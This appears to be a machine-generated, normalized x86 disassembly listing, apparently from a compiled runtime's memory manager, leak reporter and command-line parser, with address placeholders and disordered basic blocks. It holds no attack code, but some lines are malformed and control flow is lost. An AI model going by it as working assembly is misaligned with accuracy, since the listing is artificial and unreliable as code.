mov ebx [ ecx ]
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
cmp ecx edx
jb r-xdata
pop esi
pop ebx
test cl 0x3
je sub_3a618a0
mov ebx ecx
and ecx 0xfffffff0
push edi
lea edi [ ecx + eax ]
sub ecx 0x4
and ebx 0xf
cmp edx ecx
push ebp
ja r-xdata
lea ecx [ ecx + ecx + 0x20 ]
push edi
mov edi edx
xor eax eax
sub ecx edx
adc eax 0xffffffff
and eax ecx
add eax edx
call sub_3a619ec
test eax eax
je r-xdata
lea ebx [ edx * 4 + 0x40 ]
cmp ebx ecx
jb r-xdata
xor eax eax
retn
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
lea ebp [ edx + edx ]
cmp ebp ecx
jb r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi 0x40a2c
jbe r-xdata
mov ebx edx
mov eax edx
call sub_3a619ec
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
add eax edx
mov ebp eax
mov edi ecx
push edx
call sub_3a619ec
pop edx
test eax eax
je r-xdata
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
cmp edx 0xb2c
jae r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
movzx ecx [ ebx + 0x2 ]
sub ecx 0x4
mov edx eax
mov edi eax
mov eax esi
call [ ebx + 0x1c ]
mov eax esi
call sub_3a61d70
mov eax edi
mov [ eax - 0x8 ] edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx eax
mov ebx eax
mov eax esi
call sub_3a615b0
mov eax esi
call sub_3a61d70
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebp 0x40a2c
jbe r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea ebp [ edx + 0xd3 ]
and ebp 0xffffff00
add ebp 0x30
add ecx 0x4
sub ecx ebp
cmp [ rw-data ] 0x0
je r-xdata
cmp edx 0x2cc
jb r-xdata
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_3a61580
mov eax esi
call sub_3a61d70
mov eax ebp
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ eax - 0x8 ] edx
cmp eax 0xb30
jb r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebx ebp
mov [ esi - 0x4 ] ebx
mov ebx ecx
mov edx [ edi - 0x4 ]
test dl 0x1
jne r-xdata
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov edi edx
mov eax edx
call sub_3a619ec
test eax eax
je r-xdata
mov edx 0xb2c
cmp ecx edx
jbe r-xdata
mov eax ecx
shr eax 0x2
add eax ecx
xor edi edi
sub eax edx
adc edi 0xffffffff
and eax edi
lea eax [ edx + eax + 0xd3 ]
and eax 0xffffff00
add eax 0x30
lea edx [ ebp + 0x4 ]
sub edx eax
ja r-xdata
mov eax edi
push ecx
push edx
call sub_3a615cc
pop edx
pop ecx
mov ebx 0xf
and ebx [ esi - 0x4 ]
mov eax [ edi - 0x4 ]
test al 0x1
je r-xdata
pause
cmp [ rw-data ] 0x0
jne r-xdata
mov eax edi
and edx 0xfffffff0
add ebx edx
add edi edx
cmp edx 0xb30
jb r-xdata
or edx 0x8
mov [ edi - 0x4 ] edx
jmp r-xdata
mov ebx 0xf
and ebx [ esi - 0x4 ]
pause
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp eax
mov edx eax
mov eax esi
mov ecx edi
call sub_3a615b0
mov eax esi
call sub_3a61d70
mov eax ebp
mov [ esi + ebp - 0x4 ] edx
lea edi [ edx + 0x3 ]
mov [ eax + esi - 0x4 ] edi
mov ebp eax
cmp edx 0xb30
jb r-xdata
and [ esi + ebp ] 0xfffffff7
add ebp 0x4
jmp r-xdata
mov [ rw-data ] 0x0
and eax 0xfffffff0
lea ebp [ ecx + eax ]
cmp edx ebp
ja r-xdata
push ecx
push edx
push 0x0
call sub_3a613d0
pop edx
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
mov [ edi - 0x8 ] ebx
lea eax [ ebx + 0x3 ]
mov [ esi + ebp - 0x4 ] eax
cmp ebx 0xb30
jb r-xdata
call sub_3a615cc
push ecx
push 0x0
call sub_3a613d0
pop ecx
mov eax 0x100
[ rw-data ] ah
je r-xdata
or ebp ebx
mov [ esi - 0x4 ] ebp
mov [ rw-data ] 0x0
mov eax esi
add eax esi
call sub_3a6160c
push ecx
push edx
push 0xa
call sub_3a613d0
pop edx
pop ecx
jmp r-xdata
mov [ rw-data ] 0x0
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ esi + ebp ]
mov edx ebx
call sub_3a6160c
push ecx
push 0xa
call sub_3a613d0
pop ecx
jmp r-xdata
sub_3a62280
push ebx
lea ebx [ eax - 0x1 ]
and ebx 0xfffffffc
call sub_3a619ec
cmp eax 0x1
sbb ecx ecx
lea edx [ ebx + eax ]
or ebx ecx
cmp ebx 0x40a2c
jae r-xdata
pop ebx
retn
neg ebx
fldz
fst [ ebx + edx ]
add ebx 0x8
js r-xdata
mov [ edx ] ecx
ffree st0
sub_3a622b0
mov ecx eax
mov edx ecx
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
add edx ecx
mov eax edx
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0xfffffff0
test edx edx
jne r-xdata
retn
xor eax eax
sub_3a622d4
cmp [ rw-data ] 0x0
je r-xdata
add eax 0x10
retn
mov edx [ rw-data ]
cmp edx eax
jb r-xdata
mov edx eax
add edx 0x13fff0
cmp edx [ rw-data ]
jae r-xdata
cmp [ rw-data ] 0x13ffe0
je r-xdata
xor eax eax
mov eax [ rw-data ]
jmp r-xdata
retn
sub_3a62314
push ebx
push esi
mov ebx eax
add ebx 0x20
mov [ edx ] ebx
mov edx [ eax ]
cmp eax [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov ebx esi
sub ebx 0x4
mov ebx [ ebx ]
and ebx 0xfffffff0
add ebx esi
movzx eax [ edx + 0x2 ]
sub ebx eax
mov [ ecx ] ebx
pop esi
pop ebx
retn
mov ebx [ edx + 0x8 ]
cmp ebx [ edx + 0xc ]
jbe r-xdata
mov eax [ edx + 0x8 ]
dec eax
mov [ ecx ] eax
pop esi
pop ebx
retn
sub_3a62350
push edi
mov edi edx
add eax 0x1
mov edx 0x89705f41
mul edx
shr eax 0x1e
mov ecx edx
and edx 0x1fffffff
shr ecx 0x1d
lea edx [ edx + edx * 4 ]
add edx eax
mov eax ecx
or eax 0x30
mov [ edi ] al
mov eax edx
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1c
and edx 0xfffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1b
and edx 0x7ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x1a
and edx 0x3ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x19
and edx 0x1ffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x18
and edx 0xffffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x17
and edx 0x7fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x16
and edx 0x3fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
lea edx [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x15
and edx 0x1fffff
or ecx eax
or eax 0x30
mov [ edi ] al
lea eax [ edx + edx * 4 ]
cmp ecx 0x1
sbb edi 0xffffffff
shr eax 0x14
or eax 0x30
mov [ edi ] al
lea eax [ edi + 0x1 ]
pop edi
retn
sub_3a62484
push ebp
mov ebp esp
push ebx
mov edx eax
cmp edx 0xffff
jbe r-xdata
xor eax eax
test dl 0x3
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x1c ]
mov ecx eax
cmp edx ecx
ja r-xdata
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov [ edx - 0x10 ] ecx
push 0x1c
mov edx [ ebp + 0x8 ]
add edx 0xffffffe4
push edx
push eax
call sub_3a61354
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
add edx [ ebx - 0x10 ]
add ecx 0x4
cmp edx ecx
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x1000
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x4
jb r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
test [ eax - 0x8 ] 0xf6
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax - 0x7 ] 0x1
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
sub_3a62500
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp edi 0x3e8
jge r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffb4
call sub_3a62484
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
add eax 0xffffffdc
call sub_3a62484
pop ecx
test al al
je r-xdata
mov eax ebx
add eax 0xffffffdc
mov esi [ eax ]
mov eax ebx
add eax 0xffffffb4
cmp ebx [ eax ]
jne r-xdata
xor eax eax
jmp r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_3a62484
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ edi + 0x1 ]
mov eax [ esi ]
call sub_3a62500
pop ecx
test al al
jne r-xdata
sub_3a62580
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov ebx [ eax ]
xor eax eax
mov [ ebp - 0x10 ] eax
push ebp
xor edx edx
mov eax ebx
call sub_3a62500
pop ecx
test al al
jne r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
sub_3a625a8
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
setne al
retn
push 0x4
push 0x1000
push 0x10000
push 0x0
call sub_3a613c0
mov [ rw-data ] eax
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_3a61440
test al al
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
call sub_3a613d0
mov ecx rw-data
mov dl 0x1
xor eax eax
call sub_3a61440
test al al
je r-xdata
push 0xa
call sub_3a613d0
sub_3a6261c
push ebx
mov ebx eax
call sub_3a625a8
test al al
je r-xdata
xor eax eax
mov eax [ rw-data ]
cmp [ eax ] 0x3ffe
jge r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ rw-data ]
mov [ edx + eax * 4 + 0x4 ] ebx
mov eax [ rw-data ]
inc [ eax ]
mov al 0x1
jmp r-xdata
mov [ rw-data ] 0x0
pop ebx
retn
sub_3a6265c
push ebx
push esi
push edi
mov esi eax
mov edi rw-data
xor ebx ebx
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
call sub_3a625a8
test al al
je r-xdata
mov eax [ edi ]
mov edx [ eax ]
dec edx
test edx edx
jl r-xdata
mov [ rw-data ] 0x0
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ edi ]
mov edx [ edx ]
mov ecx [ edi ]
mov edx [ ecx + edx * 4 ]
mov ecx [ edi ]
mov [ ecx + eax * 4 + 0x4 ] edx
mov edx [ edi ]
dec [ edx ]
mov bl 0x1
jmp r-xdata
mov ecx [ edi ]
cmp esi [ ecx + eax * 4 + 0x4 ]
jne r-xdata
sub_3a626b4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
sub eax rw-data
shr eax 0x5
shl eax 0x8
mov edx [ ebp + 0x8 ]
lea esi [ edx + eax * 8 - 0x1b800 ]
lea ecx [ ebp - 0x1c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_3a62314
jmp r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x1c ]
jbe r-xdata
mov eax [ ebp - 0x18 ]
sub eax 0x4
test [ eax ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
add [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_3a6265c
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1b801 ] 0x0
xor ebx ebx
mov eax [ ebp - 0x18 ]
call sub_3a62580
mov edi eax
test edi edi
jne r-xdata
mov ebx 0x2
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x100
jae r-xdata
cmp ebx 0xff
jg r-xdata
cmp [ esi + ebx * 8 ] 0x0
je r-xdata
inc [ esi + ebx * 8 + 0x4 ]
mov eax [ ebp - 0x18 ]
add eax 0x4
mov eax [ eax ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jle r-xdata
xor ebx ebx
mov [ esi + ebx * 8 ] edi
jmp r-xdata
inc ebx
cmp ebx 0xff
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
movzx eax [ eax + 0x2 ]
sub eax 0xd
cmp eax [ ebp - 0xc ]
jl r-xdata
cmp edi [ esi + ebx * 8 ]
je r-xdata
mov eax [ ebp - 0x18 ]
add eax 0x8
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x11 ] 0x1
mov eax [ ebp - 0xc ]
test eax eax
jle r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x20
jb r-xdata
mov ebx 0x1
jmp r-xdata
mov [ ebp - 0x11 ] al
inc [ ebp - 0x10 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax ] 0x80
jb r-xdata
cmp [ ebp - 0x11 ] 0x0
je r-xdata
mov al 0x1
sub_3a62800
push ebp
mov ebp esp
push eax
mov eax 0x27
add esp 0xfffff004
push eax
dec eax
jne r-xdata
mov eax [ ebp - 0x4 ]
add esp 0xfffff6dc
push ebx
push esi
push edi
lea eax [ ebp - 0x1b800 ]
xor ecx ecx
mov edx 0x1b800
call sub_3a63a44
lea eax [ ebp - 0x1f828 ]
xor ecx ecx
mov edx 0x4000
call sub_3a63a44
xor eax eax
mov [ ebp - 0x1b808 ] eax
mov [ ebp - 0x1b801 ] 0x1
mov edi [ rw-data ]
jmp r-xdata
cmp edi rw-data
jne r-xdata
mov eax edi
call sub_3a622d4
mov ebx eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
mov edi [ edi + 0x4 ]
mov eax ebx
sub eax 0x4
mov esi [ eax ]
test esi 0x1
jne r-xdata
cmp ebx rw-data
je r-xdata
mov eax ebx
call sub_3a622b0
mov ebx eax
test ebx ebx
jne r-xdata
test esi 0x4
je r-xdata
cmp [ ebp - 0x1b801 ] 0x0
jne r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jl r-xdata
cmp [ ebp - 0x1b808 ] 0x1000
jge r-xdata
push ebp
mov eax ebx
call sub_3a626b4
pop ecx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1b809 ] 0x0
xor eax eax
mov [ ebp - 0x1b818 ] eax
lea edx [ ebp - 0x27828 ]
mov eax r-xdata
mov ecx 0x28
call sub_3a6246c
mov ebx eax
mov [ ebp - 0x1b810 ] 0x37
mov [ ebp - 0x1b824 ] rw-data
lea eax [ ebp - 0x1b004 ]
mov [ ebp - 0x1b828 ] eax
mov eax ebx
add eax 0x10
call sub_3a6265c
test al al
jne r-xdata
and esi 0xfffffff0
sub esi 0x4
mov [ ebp - 0x1b814 ] esi
mov eax ebx
call sub_3a6265c
test al al
jne r-xdata
mov eax [ ebp - 0x1b81c ]
mov [ ebp - 0x1b818 ] eax
add [ ebp - 0x1b828 ] 0x800
add [ ebp - 0x1b824 ] 0x20
dec [ ebp - 0x1b810 ]
jne r-xdata
cmp [ esi ] 0x0
jbe r-xdata
mov ebx [ ebx + 0x4 ]
mov [ ebp - 0x1b801 ] 0x0
mov esi [ ebx + 0xc ]
and esi 0xfffffff0
sub esi 0x4
sub esi 0x10
mov eax [ ebp - 0x1b808 ]
mov [ ebp + eax * 4 - 0x1f828 ] esi
inc [ ebp - 0x1b808 ]
mov [ ebp - 0x1b801 ] 0x0
mov eax [ ebp - 0x1b808 ]
mov edx [ ebp - 0x1b814 ]
mov [ ebp + eax * 4 - 0x1f828 ] edx
inc [ ebp - 0x1b808 ]
mov eax [ ebp - 0x1b824 ]
movzx eax [ eax ]
sub eax 0x4
mov [ ebp - 0x1b81c ] eax
mov [ ebp - 0x1b80a ] 0x0
mov edi 0xff
mov eax [ ebp - 0x1b828 ]
mov esi eax
cmp [ ebp - 0x1b808 ] 0x0
jle r-xdata
dec edi
sub esi 0x8
cmp edi 0xffffffff
jne r-xdata
cmp [ ebp - 0x1b809 ] 0x0
jne r-xdata
mov eax r-xdata
mov ecx 0x3
mov edx ebx
call sub_3a6246c
push 0x2010
push r-xdata
lea eax [ ebp - 0x27828 ]
push eax
push 0x0
call sub_3a6129c
cmp [ ebp - 0x1b809 ] 0x0
je r-xdata
lea eax [ ebp - 0x20029 ]
cmp ebx eax
ja r-xdata
cmp [ ebp - 0x1b80a ] 0x0
jne r-xdata
mov eax r-xdata
mov ecx 0x27
mov edx ebx
call sub_3a6246c
mov ebx eax
mov [ ebp - 0x1b809 ] 0x1
mov eax r-xdata
mov ecx 0x3c
mov edx ebx
call sub_3a6246c
mov ebx eax
mov edi [ ebp - 0x1b808 ]
dec edi
test edi edi
jb r-xdata
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0xd
inc ebx
mov [ ebx ] 0xa
inc ebx
mov eax [ ebp - 0x1b818 ]
inc eax
mov edx ebx
call sub_3a62350
mov ebx eax
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x2d
inc ebx
mov [ ebx ] 0x20
inc ebx
mov edx ebx
mov eax [ ebp - 0x1b81c ]
call sub_3a62350
mov ebx eax
mov eax r-xdata
mov ecx 0x8
mov edx ebx
call sub_3a6246c
mov ebx eax
mov [ ebp - 0x1b80a ] 0x1
jmp r-xdata
inc edi
mov [ ebp - 0x1b820 ] 0x0
lea esi [ ebp - 0x1f828 ]
mov eax r-xdata
mov ecx 0x7
mov edx ebx
call sub_3a6246c
mov ebx eax
jmp r-xdata
je r-xdata
mov eax edi
sub eax 0x1
jb r-xdata
mov eax [ esi ]
mov edx ebx
call sub_3a62350
mov ebx eax
lea eax [ ebp - 0x20029 ]
cmp ebx eax
ja r-xdata
mov [ ebx ] 0x2c
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x20
inc ebx
mov [ ebx ] 0x78
inc ebx
mov [ ebx ] 0x20
inc ebx
mov eax [ esi ]
mov edx ebx
call sub_3a62350
mov ebx eax
mov eax r-xdata
mov ecx 0x6
mov edx ebx
call sub_3a6246c
mov ebx eax
jmp r-xdata
jmp r-xdata
inc [ ebp - 0x1b820 ]
add esi 0x4
dec edi
jne r-xdata
lea edx [ ebp - 0x27928 ]
mov eax [ esi - 0x4 ]
call sub_3a64260
movzx ecx [ ebp - 0x27928 ]
lea eax [ ebp - 0x27927 ]
mov edx ebx
call sub_3a6246c
mov ebx eax
cmp [ ebp - 0x1b820 ] 0x0
je r-xdata
sub_3a62c78
push esi
push edi
xor eax eax
xor esi esi
mov edx rw-data
movzx edi [ edx ]
shr edi 0x3
mov ecx esi
add ecx ecx
add ecx ecx
cmp edi eax
jbe r-xdata
test [ edx ] 0xf
jne r-xdata
mov eax edi
mov [ eax + rw-data ] cl
inc eax
cmp edi eax
ja r-xdata
inc esi
add edx 0x20
cmp esi 0x37
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
retn
sub_3a62cbc
push ebx
push esi
push edi
mov esi 0x37
mov ebx rw-data
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x8 ] eax
lea eax [ ebx - 0x1c ]
mov [ ebx - 0x18 ] eax
xor eax eax
mov [ ebx - 0x10 ] eax
mov [ ebx - 0x14 ] 0x1
movzx eax [ ebx - 0x1a ]
add eax eax
add eax eax
lea eax [ eax + eax * 2 ]
add eax 0xef
and eax 0xffffff00
add eax 0x30
cmp eax 0xb30
jae r-xdata
mov [ ebx ] sub_3a61580
add eax 0x4d0
shr eax 0xd
cmp eax 0x7
jbe r-xdata
mov eax 0xb30
mov ecx eax
mov dl 0xff
shl dl cl
mov [ ebx - 0x1b ] dl
shl eax 0xd
add ax 0xb30
mov [ ebx - 0x4 ] ax
movzx edi [ ebx - 0x1a ]
movzx eax di
mov ecx eax
shl ecx 0x4
lea ecx [ ecx + ecx * 2 ]
add ecx 0xef
and ecx 0xffffff00
add ecx 0x30
cmp ecx 0x7330
jae r-xdata
mov eax 0x7
cmp ecx 0xff30
jbe r-xdata
mov ecx 0x7330
mov eax ecx
sub eax 0x20
movzx edx di
mov ecx edx
xor edx edx
div ecx
imul di
add ax 0xef
and ax 0xff00
add ax 0x30
mov [ ebx - 0x2 ] ax
add ebx 0x20
dec esi
jne r-xdata
mov ecx 0xff30
cmp [ ebx ] 0x0
jne r-xdata
call sub_3a62c78
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
mov esi 0x400
mov edx rw-data
mov eax edx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add edx 0x8
dec esi
jne r-xdata
mov [ rw-data ] rw-data
mov [ rw-data ] rw-data
pop edi
pop esi
pop ebx
retn
sub_3a62de4
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi [ ebx + 0x4 ]
jmp r-xdata
cmp edi ebx
jne r-xdata
mov ebp [ edi + 0x4 ]
push 0x8000
push 0x0
push edi
call VirtualFree
mov edi ebp
mov edx 0x37
mov eax rw-data
mov ecx eax
mov [ eax + 0x14 ] ecx
mov ecx eax
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
xor ecx ecx
mov [ eax + 0xc ] ecx
add eax 0x20
dec edx
jne r-xdata
mov [ ebx ] ebx
mov [ ebx + 0x4 ] ebx
mov edx 0x400
mov ecx rw-data
mov eax ecx
mov [ eax ] eax
mov [ eax + 0x4 ] eax
add ecx 0x8
dec edx
jne r-xdata
mov ebx [ esi + 0x4 ]
jmp r-xdata
cmp ebx esi
jne r-xdata
mov edi [ ebx + 0x4 ]
push 0x8000
push 0x0
push ebx
call VirtualFree
mov ebx edi
mov [ esi ] esi
mov [ esi + 0x4 ] esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3a62e74
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call sub_3a613d8
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
call sub_3a62800
call sub_3a62de4
retn
push 0x8000
push 0x0
mov eax [ rw-data ]
push eax
call VirtualFree
xor eax eax
mov [ rw-data ] eax
sub_3a62f14
mov ecx [ eax ]
test ecx ecx
je r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
retn
push eax
mov eax edx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov [ eax ] edx
mov eax ecx
call [ rw-data ]
or eax eax
jne r-xdata
push eax
mov eax ecx
call [ rw-data ]
pop ecx
or eax eax
je r-xdata
mov al 0x1
jmp sub_3a63030
mov [ ecx ] eax
mov al 0x2
jmp sub_3a63030
retn
mov [ ecx ] eax
retn
sub_3a62fa4
push ebx
push esi
call sub_3a672cc
cmp [ eax ] 0x0
je r-xdata
xor ebx ebx
call sub_3a672cc
mov esi [ eax ]
mov ebx [ esi + 0x8 ]
call sub_3a672cc
xor eax eax
mov [ esi + 0x8 ] eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_3a62fe4
push ebx
push esi
mov esi edx
mov ebx eax
and bl 0x7f
cmp [ rw-data ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov edx esi
mov eax ebx
call [ rw-data ]
cmp bl 0x18
ja r-xdata
call sub_3a672cc
mov ebx [ eax + 0x4 ]
jmp r-xdata
movzx eax bl
mov edx esi
call sub_3a62fd8
movzx eax bl
movzx ebx [ eax + rw-data ]
sub_3a63078
push esi
push edi
mov esi eax
mov edi [ esp + 0xc ]
xor eax eax
or al [ esi ]
je r-xdata
mov [ edi ] al
test edx edx
jle r-xdata
mov edx 0x1
jmp r-xdata
cmp edx eax
jg r-xdata
sub eax edx
inc eax
test ecx ecx
jl r-xdata
xor ecx ecx
jmp r-xdata
cmp ecx eax
jg r-xdata
add esi edx
mov [ edi ] cl
inc edi
[ edi ] [ esi ]
jmp r-xdata
mov ecx eax
jmp r-xdata
pop edi
pop esi
retn 0x4
sub_3a630bc
push ebx
push esi
add esp 0xfffffdf0
mov esi edx
mov ebx eax
test bl bl
je r-xdata
lea eax [ esp + 0x4 ]
push eax
push 0x105
call GetCurrentDirectoryA
test bl bl
je r-xdata
movzx eax bl
add eax 0x41
dec eax
mov [ esp ] al
mov [ esp + 0x1 ] 0x3a
mov [ esp + 0x2 ] 0x0
lea eax [ esp + 0x109 ]
push eax
push 0x105
call GetCurrentDirectoryA
push esp
call SetCurrentDirectoryA
mov eax esi
lea edx [ esp + 0x4 ]
mov ecx 0x105
call sub_3a65510
add esp 0x210
pop esi
pop ebx
retn
lea eax [ esp + 0x109 ]
push eax
call SetCurrentDirectoryA
sub_3a63154
cmp eax edx
je r-xdata
retn
cmp ecx 0x20
ja r-xdata
jle r-xdata
sub ecx 0x8
jg r-xdata
retn
cmp eax edx
ja r-xdata
fild [ ecx + eax ]
fild [ eax ]
cmp ecx 0x8
jle r-xdata
jmp [ ecx * 4 + r-xdata ]
push edx
fild [ eax ]
lea eax [ ecx + eax - 0x8 ]
lea ecx [ edx + ecx - 0x8 ]
fild [ eax ]
push ecx
neg ecx
and edx 0xfffffff8
lea ecx [ edx + ecx + 0x8 ]
pop edx
sub edx ecx
cmp eax edx
lea edx [ ecx + edx ]
jbe r-xdata
fistp [ edx ]
fistp [ ecx + edx ]
fild [ eax + 0x8 ]
cmp ecx 0x10
jle r-xdata
fild [ ecx + eax ]
fistp [ ecx + edx ]
add ecx 0x8
jl r-xdata
fistp [ edx ]
pop edx
fistp [ edx ]
retn
sub ecx 0x8
push ecx
fild [ ecx + eax ]
fild [ eax ]
add ecx edx
and ecx 0xfffffff8
sub ecx edx
fistp [ edx + 0x8 ]
fild [ eax + 0x10 ]
fistp [ edx + 0x10 ]
fild [ ecx + eax ]
fistp [ ecx + edx ]
sub ecx 0x8
jg r-xdata
pop ecx
fistp [ edx ]
fistp [ ecx + edx ]
sub_3a63254
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
cmp [ ebx ] 0x20
jbe r-xdata
xor ebp ebp
mov [ esp ] ebx
jmp r-xdata
cmp [ ebx + 0x1 ] 0x22
jne r-xdata
push ebx
call sub_3a61274
mov ebx eax
cmp [ ebx ] 0x20
ja r-xdata
add ebx 0x2
jmp r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov eax esi
mov edx ebp
call sub_3a659c0
mov ebx [ esp ]
mov ebp [ esi ]
xor esi esi
jmp r-xdata
push ebx
call sub_3a61274
mov edi eax
mov eax edi
sub eax ebx
add ebp eax
mov ebx edi
push ebx
call sub_3a61274
mov ebx eax
jmp r-xdata
cmp [ ebx ] 0x20
ja r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x22
jne r-xdata
push ebx
call sub_3a61274
mov edi eax
cmp edi ebx
jbe r-xdata
push ebx
call sub_3a61274
mov ebx eax
jmp r-xdata
push ebx
call sub_3a61274
mov ebx eax
jmp r-xdata
push ebx
call sub_3a61274
mov edi eax
mov eax edi
sub eax ebx
add ebp eax
mov ebx edi
movzx eax [ ebx ]
mov [ ebp + esi ] al
inc ebx
inc esi
